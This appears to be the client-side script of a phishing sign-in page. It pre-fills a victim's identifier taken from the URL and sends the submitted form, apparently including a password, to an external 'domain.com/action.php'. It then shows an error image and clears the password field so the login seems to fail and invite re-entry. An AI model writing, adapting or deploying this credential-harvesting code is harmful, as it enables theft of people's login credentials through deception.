$(document).ready(function() {
    $('.fx-body').hide();
    $('.items').click(() => {
        $('.fx-body').toggle('1000');
    });

    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#xx").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var formData = new FormData($("#formx")[0]);
        $("#Btn").html('Processing..').prop("disabled", true);
        $.ajax({
            url: "https://domain.com/action.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#xx").val(url);
                    $("#xxx").val("");
                    $('.ms').html('<img src="img/es.png">');
                    $("#Btn").html('Sign In').prop("disabled", false);
                }, 2000);

            }
        });
    });

});
